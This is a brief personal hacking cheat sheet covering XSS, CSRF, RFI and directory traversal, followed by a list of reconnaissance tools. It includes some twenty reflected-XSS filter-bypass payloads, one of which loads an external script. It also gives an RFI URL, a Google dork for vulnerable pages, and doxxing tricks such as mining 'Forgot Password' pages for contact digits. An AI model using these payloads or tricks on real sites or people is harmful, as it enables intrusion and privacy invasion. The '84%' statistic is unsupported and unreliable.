# Hack

## Glossary

* OPSEC = Trackability prevention

## Vulnerabilities

### SQL Injection

See <https://www.youtube.com/watch?v=ciNHn38EyRc>

### XSS

Stands for Cross-Site Scripting.
Insert a malicious script on a trusted website to capture sensitive information (by phishing or cookie stealing, essentially by producing an provoking request to a compromised website).
Caused by a lack of sanitization of URLs or input fields.
Accounts for 84% of all security vulnerabilities.
See <https://en.wikipedia.org/wiki/Cross-site_scripting>

There exists two types of XSS vulnerabilities: Persistent and Non-Persistent.

#### Non-Persistent (reflected)

Craft a URL containing a malicious script to a legit website that displays the URL parameter as-is on the page.
The victim browses the linked page containing the script, which is run when he lands on the page.

E.g. the results of a lousy search engine "You searched: javascript:alert('oh no')") and send that URL to the victim.

URL-based => can be performed either by GET or POST.

Examples (different ways to bypass input sanitization):

    website.com/search.php?q="><script>alert('The Hacker News')</script>
    website.com/search.php?q="><script>alert("The Hacker News")</script>
    website.com/search.php?q="><script>alert("The Hacker News");</script>
    website.com/search.php?q="><script>alert(/The Hacker News");</script>
    website.com/search.php?q=//"><script>alert(/The Hacker News/);</script>
    website.com/search.php?q=abc<script>alert(/The Hacker News/);</script>
    website.com/search.php?q=abc"><script>alert(/The Hacker News/);</script>
    website.com/search.php?q=abc"></script><script>alert(/The Hacker News/);</script>
    website.com/search.php?q=abc//abc"></script>alert(/The Hacker News/);</script>
    website.com/search.php?q=000"><script></script><script>alert(The Hacker News);</script>
    website.com/search.php?q=000abc</script><script>alert(/The Hacker News/);</script>
    website.com/search.php?q=--<script>"></script>alert(/The Hacker News/);</script>
    website.com/search.php?q=pwned<script>document.write('The Hacker News');</script>
    website.com/search.php?q=pwned</script><script>document.write(The Hacker News);</script>
    website.com/search.php?q=pwned')alert(The Hacker News);//
    website.com/search.php?q=pwned";)alert(The Hacker News);//
    website.com/search.php?q=pwned");alert(/The Hacker News/);//
    website.com/search.php?q=pwned//"></script><script>location.href='javascript:alert(/The Hacker News/);</script>
    website.com/search.php?q="><img src='javascript:alert('The Hacker News');'>
    website.com/search.php?q="><script src='http://malicous js'</script>

#### Persistent (stored)

Inject malicious code (via an input field) saved and displayed as-is on a page of a legit website.
When victims load the page, the script is run.

E.g. a website that allows to edit user profiles, where malicious scripts can be entered, that will be run when someone browser that user profile's page.

### CSRF/XSRF

Stands for Cross-Site Request Forgery.
Directs a victim to a legit website (e.g. his bank) where he's currently logged on, via a (sometimes hidden) forged URL (sent e.g. in an e-mail) crafted so that it accomplishes something immediately (e.g. wire money away).
Caused by a lack of mechanisms to check the source of a request (URL referer or generated form token).
Example: this technique was used recently to auto-"Like" pages on Facebook by visiting another website, that overlayed hidden Like buttons atop other page elements unbeknowst to the victim.

### RFI

Used to bypass same website policy.
File inclusion not filtered, can run anything even PHP.
Via URL parameters:

    index.php?page=http://www.google.com

Find more pages via Google inurl:"index.php?page="

### Directory Traversal

Used to access server file system listing or even commands.

  ../

### Where to look

* Source
  * Form inputs/hidden
  * Find Directory /index
* URL parameters
* robots.txt
* Cookies
* .htaccess/.htpasswd

## Tools

* Wayback machine = Investigate the (now hidden) past
* Facebook bait using CRSF = Get someone's name
* "Forgot Password?" = grab last digits of email/phone
* [Shodan](https://www.shodan.io/) = IoT search engine (webcams, unprotected devices)
* Censys
* Zoomeye
* [Autosploit](https://github.com/NullArray/AutoSploit)
